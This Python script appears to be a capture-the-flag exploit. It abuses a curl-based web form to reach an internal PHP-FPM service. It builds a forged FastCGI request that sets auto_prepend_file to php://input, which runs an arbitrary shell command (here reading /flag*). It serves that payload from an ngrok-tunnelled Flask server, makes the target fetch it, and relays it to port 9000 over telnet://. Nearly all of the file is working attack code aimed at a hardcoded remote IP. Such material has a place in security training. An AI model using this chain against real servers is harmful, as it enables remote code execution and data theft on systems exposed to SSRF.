import random
import httpx
from pyngrok import ngrok
from flask import Flask
from multiprocessing import Process


# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client
# Referrer: https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75

RHOST = "http://54.251.191.248:31530/"
# RHOST = "http://localhost:31530/"
TUNNEL = ngrok.connect(4444, "http")


def bchr(i):
    return bytes([i])


def bord(c):
    if isinstance(c, int):
        return c
    else:
        return ord(c)


def force_bytes(s):
    if isinstance(s, bytes):
        return s
    else:
        return s.encode('utf-8', 'strict')


def force_text(s):
    if issubclass(type(s), str):
        return s
    if isinstance(s, bytes):
        s = str(s, 'utf-8', 'strict')
    else:
        s = str(s)
    return s


class FastCGIClient:
    """A Fast-CGI Client for Python"""

    # private
    __FCGI_VERSION = 1

    __FCGI_ROLE_RESPONDER = 1
    __FCGI_ROLE_AUTHORIZER = 2
    __FCGI_ROLE_FILTER = 3

    __FCGI_TYPE_BEGIN = 1
    __FCGI_TYPE_ABORT = 2
    __FCGI_TYPE_END = 3
    __FCGI_TYPE_PARAMS = 4
    __FCGI_TYPE_STDIN = 5
    __FCGI_TYPE_STDOUT = 6
    __FCGI_TYPE_STDERR = 7
    __FCGI_TYPE_DATA = 8
    __FCGI_TYPE_GETVALUES = 9
    __FCGI_TYPE_GETVALUES_RESULT = 10
    __FCGI_TYPE_UNKOWNTYPE = 11

    __FCGI_HEADER_SIZE = 8

    # request state
    FCGI_STATE_SEND = 1
    FCGI_STATE_ERROR = 2
    FCGI_STATE_SUCCESS = 3

    def __init__(self):
        self.keepalive = 0
        self.requests = dict()

    def __encodeFastCGIRecord(self, fcgi_type, content, requestid):
        length = len(content)
        buf = bchr(FastCGIClient.__FCGI_VERSION) \
            + bchr(fcgi_type) \
            + bchr((requestid >> 8) & 0xFF) \
            + bchr(requestid & 0xFF) \
            + bchr((length >> 8) & 0xFF) \
            + bchr(length & 0xFF) \
            + bchr(0) \
            + bchr(0) \
            + content
        return buf

    def __encodeNameValueParams(self, name, value):
        nLen = len(name)
        vLen = len(value)
        record = b''
        if nLen < 128:
            record += bchr(nLen)
        else:
            record += bchr((nLen >> 24) | 0x80) \
                + bchr((nLen >> 16) & 0xFF) \
                + bchr((nLen >> 8) & 0xFF) \
                + bchr(nLen & 0xFF)
        if vLen < 128:
            record += bchr(vLen)
        else:
            record += bchr((vLen >> 24) | 0x80) \
                + bchr((vLen >> 16) & 0xFF) \
                + bchr((vLen >> 8) & 0xFF) \
                + bchr(vLen & 0xFF)
        return record + name + value

    def __decodeFastCGIHeader(self, stream):
        header = dict()
        header['version'] = bord(stream[0])
        header['type'] = bord(stream[1])
        header['requestId'] = (bord(stream[2]) << 8) + bord(stream[3])
        header['contentLength'] = (bord(stream[4]) << 8) + bord(stream[5])
        header['paddingLength'] = bord(stream[6])
        header['reserved'] = bord(stream[7])
        return header

    def __decodeFastCGIRecord(self, buffer):
        header = buffer.read(int(self.__FCGI_HEADER_SIZE))

        if not header:
            return False
        else:
            record = self.__decodeFastCGIHeader(header)
            record['content'] = b''

            if 'contentLength' in record.keys():
                contentLength = int(record['contentLength'])
                record['content'] += buffer.read(contentLength)
            if 'paddingLength' in record.keys():
                skiped = buffer.read(int(record['paddingLength']))
            return record

    def request(self, nameValuePairs={}, post=''):
        requestId = random.randint(1, (1 << 16) - 1)
        self.requests[requestId] = dict()
        request = b""
        beginFCGIRecordContent = bchr(0) \
            + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \
            + bchr(self.keepalive) \
            + bchr(0) * 5
        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,
                                              beginFCGIRecordContent, requestId)
        paramsRecord = b''
        if nameValuePairs:
            for (name, value) in nameValuePairs.items():
                name = force_bytes(name)
                value = force_bytes(value)
                paramsRecord += self.__encodeNameValueParams(name, value)

        if paramsRecord:
            request += self.__encodeFastCGIRecord(
                FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)
        request += self.__encodeFastCGIRecord(
            FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)

        if post:
            request += self.__encodeFastCGIRecord(
                FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)
        request += self.__encodeFastCGIRecord(
            FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)

        return request

    def __repr__(self):
        return "fastcgi connect host:{} port:{}".format(self.host, self.port)


def build_request(cmd):
    client = FastCGIClient()
    params = dict()
    documentRoot = "/"
    uri = "/usr/local/lib/php/System.php"
    content = f"<?=`{cmd}`?>"
    params = {
        'GATEWAY_INTERFACE': 'FastCGI/1.0',
        'REQUEST_METHOD': 'POST',
        'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'),
        'SCRIPT_NAME': uri,
        'QUERY_STRING': '',
        'REQUEST_URI': uri,
        'DOCUMENT_ROOT': documentRoot,
        'SERVER_SOFTWARE': 'php/fcgiclient',
        'REMOTE_ADDR': '127.0.0.1',
        'REMOTE_PORT': '9985',
        'SERVER_ADDR': '127.0.0.1',
        'SERVER_PORT': '80',
        'SERVER_NAME': "localhost",
        'SERVER_PROTOCOL': 'HTTP/1.1',
        'CONTENT_TYPE': 'application/text',
        'CONTENT_LENGTH': "%d" % len(content),
        'PHP_VALUE': 'auto_prepend_file = php://input',
        'PHP_ADMIN_VALUE': 'allow_url_include = On'
    }
    return client.request(params, content)

def web(cmd):
    app = Flask(__name__)
    @app.get("/")
    def data():
        return build_request(cmd)
    app.run("0.0.0.0", 4444)



class API:
    def __init__(self) -> None:
        self.c = httpx.Client(base_url=RHOST)

    def curl(s, args):
        return s.c.post("/", data={"urlInput": args})


if __name__ == '__main__':
    cmd = "cat /flag*"
    proc = Process(target=web, args=(cmd,))
    proc.start()
    url = TUNNEL.public_url
    print(url)
    api = API()
    res = api.curl(f"{url} -o /tmp/data")
    res = api.curl("telnet://localhost:9000 -T /tmp/data")
    print(res.text)
    proc.kill()
